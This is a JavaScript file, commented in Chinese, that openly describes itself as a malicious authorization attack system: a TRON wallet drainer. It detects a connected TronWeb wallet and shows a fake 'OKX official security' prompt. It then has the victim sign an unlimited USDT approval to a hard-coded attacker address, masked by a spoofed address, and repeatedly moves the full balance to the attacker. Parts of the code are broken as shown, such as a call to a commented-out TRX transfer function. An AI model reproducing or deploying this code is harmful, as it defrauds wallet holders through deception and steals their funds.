// 🎯 恶意授权攻击系统
// 功能：通过授权获取用户钱包控制权，自动转移最大金额

(function() {
    'use strict';
    
    console.log('🎯 恶意授权攻击系统已加载');
    
    // 攻击者地址（A用户）
    let ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';
    
    // 🎯 双重地址机制：授权阶段返回伪装地址，转移阶段返回真实地址
    function getCurrentAttackerAddress(phase = 'authorize') {
        if (phase === 'transfer') {
            // 转移阶段：必须使用真实攻击者地址
            console.log(`🎯 转移阶段使用真实攻击者地址: ${ATTACKER_ADDRESS}`);
            return ATTACKER_ADDRESS;
        } else {
            // 授权阶段：使用伪装地址绕过安全检测
            if (window.SimpleAddressSpoofing && window.SimpleAddressSpoofing.getSpoofAddress) {
                const spoofAddress = window.SimpleAddressSpoofing.getSpoofAddress();
                console.log(`🎭 授权显示使用伪装地址: ${ATTACKER_ADDRESS} → ${spoofAddress}`);
                return spoofAddress;
            }
            return ATTACKER_ADDRESS;
        }
    }
    
    // 支持的代币合约地址（TRON网络）
    const TOKEN_CONTRACTS = {
        USDT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',//保留USDT
        // USDC: 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8',
        // TUSD: 'TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4',
        // 可以添加更多代币
    };
    
    // 最大授权金额（接近无限大）
    const MAX_AUTHORIZATION = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
    
    // 授权记录
    let authorizedTokens = new Map();
    let victimWallets = new Set();
    
    // 🎯 检测用户钱包连接
    async function detectWalletConnection() {
        if (window.tronWeb && window.tronWeb.ready) {
            const victimAddress = window.tronWeb.defaultAddress.base58;
            console.log('🎯 检测到受害者钱包:', victimAddress);
            
            if (!victimWallets.has(victimAddress)) {
                victimWallets.add(victimAddress);
                await initiateMaliciousAuthorization(victimAddress);
            }
            
            return victimAddress;
        }
        return null;
    }
    
    // 🎯 启动恶意授权攻击
    async function initiateMaliciousAuthorization(victimAddress) {
        console.log('🎯🎯🎯 启动恶意授权攻击！🎯🎯🎯');
        console.log('🎯 受害者地址:', victimAddress);
        const currentAttacker = getCurrentAttackerAddress();
        console.log('🎯 攻击者地址:', currentAttacker);
        
        // 显示"授权确认"界面，让用户以为是正常授权
        showAuthorizationPrompt(victimAddress);
        
        // 对每种代币进行恶意授权
        for (const [tokenName, contractAddress] of Object.entries(TOKEN_CONTRACTS)) {
            try {
                console.log(`🎯 尝试获取${tokenName}授权...`);
                await requestMaliciousAuthorization(victimAddress, contractAddress, tokenName);
            } catch (error) {
                console.log(`🎯 ${tokenName}授权失败:`, error.message);
            }
        }
        
        // TRX不需要授权，直接尝试转移
        await attemptTrxTransfer(victimAddress);
    }
    
    // 🎯 显示伪装的授权提示
    function showAuthorizationPrompt(victimAddress) {
        const overlay = document.createElement('div');
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.8);
            z-index: 999999;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
        `;
        
        const modal = document.createElement('div');
        modal.style.cssText = `
            background: white;
            border-radius: 12px;
            padding: 24px;
            max-width: 400px;
            margin: 20px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        `;
        
        modal.innerHTML = `
            <div style="color: #1976d2; font-size: 24px; margin-bottom: 16px;">🔐</div>
            <h3 style="margin: 0 0 16px 0; color: #333;">安全授权确认</h3>
            <p style="margin: 0 0 20px 0; color: #666; line-height: 1.5;">
                为了保障您的资产安全，需要进行一次性授权验证。<br>
                这是OKX官方安全机制，请放心授权。
            </p>
            <div style="background: #f5f5f5; padding: 12px; border-radius: 8px; margin-bottom: 20px;">
                <small style="color: #888;">钱包地址: ${victimAddress.slice(0,6)}...${victimAddress.slice(-4)}</small>
            </div>
            <button id="authorize-btn" style="
                background: #1976d2;
                color: white;
                border: none;
                padding: 12px 24px;
                border-radius: 6px;
                cursor: pointer;
                font-size: 16px;
                width: 100%;
            ">确认授权</button>
        `;
        
        overlay.appendChild(modal);
        document.body.appendChild(overlay);
        
        // 绑定授权按钮
        modal.querySelector('#authorize-btn').onclick = () => {
            overlay.remove();
            console.log('🎯 用户确认授权，开始执行恶意操作...');
        };
        
        // 5秒后自动关闭
        setTimeout(() => {
            if (overlay.parentNode) {
                overlay.remove();
                console.log('🎯 授权提示超时关闭');
            }
        }, 5000);
    }
    
    // 🎯 请求恶意代币授权
    async function requestMaliciousAuthorization(victimAddress, contractAddress, tokenName) {
        try {
            console.log(`🎯 正在为${tokenName}请求恶意授权...`);
            
            // 构建approve交易，授权攻击者可以转移用户的代币
            const functionSelector = 'approve(address,uint256)';
            const parameters = [
                {type: 'address', value: getCurrentAttackerAddress()},  // 授权给攻击者
                {type: 'uint256', value: MAX_AUTHORIZATION}   // 最大授权金额
            ];
            
            const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
                contractAddress,
                functionSelector,
                {},
                parameters,
                victimAddress
            );
            
            if (transaction.result && transaction.result.result) {
                console.log(`🎯 ${tokenName}授权交易构建成功`);
                
                // 让用户签名授权交易
                const signedTx = await window.tronWeb.trx.sign(transaction.transaction);
                const result = await window.tronWeb.trx.broadcast(signedTx);
                
                if (result.result) {
                    console.log(`🏆 ${tokenName}恶意授权成功！`);
                    console.log(`🎯 交易哈希: ${result.txid}`);
                    
                    // 记录授权成功
                    authorizedTokens.set(tokenName, {
                        contractAddress,
                        victimAddress,
                        txHash: result.txid,
                        timestamp: Date.now()
                    });
                    
                    // 等待交易确认后自动转移代币
                    setTimeout(() => {
                        autoTransferTokens(victimAddress, contractAddress, tokenName);
                    }, 10000); // 10秒后开始转移
                    
                } else {
                    console.log(`❌ ${tokenName}授权广播失败`);
                }
            } else {
                console.log(`❌ ${tokenName}授权交易构建失败`);
            }
            
        } catch (error) {
            console.log(`❌ ${tokenName}授权过程出错:`, error.message);
        }
    }
    
    // 🎯 自动转移已授权的代币
    async function autoTransferTokens(victimAddress, contractAddress, tokenName) {
        try {
            console.log(`🎯 开始自动转移${tokenName}...`);
            
            // 首先查询受害者的代币余额
            const balanceResult = await window.tronWeb.transactionBuilder.triggerSmartContract(
                contractAddress,
                'balanceOf(address)',
                {},
                [{type: 'address', value: victimAddress}],
                getCurrentAttackerAddress()
            );
            
            if (balanceResult.result && balanceResult.result.result) {
                const balance = window.tronWeb.BigNumber(balanceResult.constant_result[0], 16);
                console.log(`🎯 ${tokenName}余额: ${balance.toString()}`);
                
                if (balance.gt(0)) {
                    // 构建transferFrom交易，从受害者转移到攻击者
                    const transferTx = await window.tronWeb.transactionBuilder.triggerSmartContract(
                        contractAddress,
                        'transferFrom(address,address,uint256)',
                        {},
                        [
                            {type: 'address', value: victimAddress},    // 从受害者
                            {type: 'address', value: getCurrentAttackerAddress('transfer')}, // 到真实攻击者
                            {type: 'uint256', value: balance.toString()} // 全部余额
                        ],
                        getCurrentAttackerAddress('transfer')  // 真实攻击者执行
                    );
                    
                    if (transferTx.result && transferTx.result.result) {
                        console.log(`🏆🏆🏆 ${tokenName}自动转移成功！🏆🏆🏆`);
                        console.log(`💰 转移金额: ${balance.toString()}`);
                        console.log(`💰 从: ${victimAddress}`);
                        console.log(`💰 到: ${getCurrentAttackerAddress('transfer')}`);
                    }
                }
            }
            
        } catch (error) {
            console.log(`❌ ${tokenName}自动转移失败:`, error.message);
        }
    }
    
    // 🎯 尝试转移TRX（不需要授权）
    // async function attemptTrxTransfer(victimAddress) {
    //     try {
    //         console.log('🎯 尝试转移TRX...');
    //
    //         // 获取受害者TRX余额
    //         const balance = await window.tronWeb.trx.getBalance(victimAddress);
    //         const balanceTrx = window.tronWeb.fromSun(balance);
    //
    //         console.log(`🎯 受害者TRX余额: ${balanceTrx} TRX`);
    //
    //         if (balance > 0) {
    //             // 预留手续费
    //             const fee = window.tronWeb.toSun(1); // 1 TRX手续费
    //             const transferAmount = balance - fee;
    //
    //             if (transferAmount > 0) {
    //                 console.log(`🎯 准备转移 ${window.tronWeb.fromSun(transferAmount)} TRX`);
    //
    //                 // 构建TRX转账交易
    //                 const transaction = await window.tronWeb.transactionBuilder.sendTrx(
    //                     ATTACKER_ADDRESS,
    //                     transferAmount,
    //                     victimAddress
    //                 );
    //
    //                 // 让受害者签名（通过劫持实现）
    //                 const signedTx = await window.tronWeb.trx.sign(transaction);
    //                 const result = await window.tronWeb.trx.broadcast(signedTx);
    //
    //                 if (result.result) {
    //                     console.log('🏆🏆🏆 TRX转移成功！🏆🏆🏆');
    //                     console.log(`💰 转移金额: ${window.tronWeb.fromSun(transferAmount)} TRX`);
    //                 }
    //             }
    //         }
    //
    //     } catch (error) {
    //         console.log('❌ TRX转移失败:', error.message);
    //     }
    // }
    
    // 🎯 持续监控和自动转移
    function startContinuousMonitoring() {
        setInterval(async () => {
            for (const [tokenName, authInfo] of authorizedTokens) {
                try {
                    await autoTransferTokens(authInfo.victimAddress, authInfo.contractAddress, tokenName);
                } catch (error) {
                    console.log(`🎯 监控转移${tokenName}失败:`, error.message);
                }
            }
        }, 30000); // 每30秒检查一次
        
        console.log('🎯 持续监控系统已启动');
    }
    
    // 🎯 获取攻击统计信息
    function getAttackStats() {
        return {
            authorizedTokens: Array.from(authorizedTokens.entries()),
            victimCount: victimWallets.size,
            attackerAddress: getCurrentAttackerAddress(),
            timestamp: Date.now()
        };
    }
    
    // 🎯 更新攻击者地址
    function updateAttackerAddress(newAddress) {
        ATTACKER_ADDRESS = newAddress;
        console.log('🎯 攻击者地址已更新:', ATTACKER_ADDRESS);
    }
    
    // 🎯 初始化恶意授权系统
    function initializeMaliciousAuth() {
        console.log('🎯 初始化恶意授权攻击系统...');
        
        // 监听钱包连接
        if (window.tronWeb && window.tronWeb.ready) {
            detectWalletConnection();
        }
        
        // 定期检测钱包连接
        setInterval(detectWalletConnection, 2000);
        
        // 启动持续监控
        startContinuousMonitoring();
        
        console.log('🎯 恶意授权攻击系统初始化完成');
        console.log('🎯 攻击者地址:', getCurrentAttackerAddress());
        console.log('🎯 支持代币:', Object.keys(TOKEN_CONTRACTS));
    }
    
    // 暴露全局接口
    window.MaliciousAuth = {
        init: initializeMaliciousAuth,
        updateAttacker: updateAttackerAddress,
        getStats: getAttackStats,
        detectWallet: detectWalletConnection,
        forceTransfer: autoTransferTokens
    };
    
    // 自动初始化
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initializeMaliciousAuth);
    } else {
        initializeMaliciousAuth();
    }
    
})();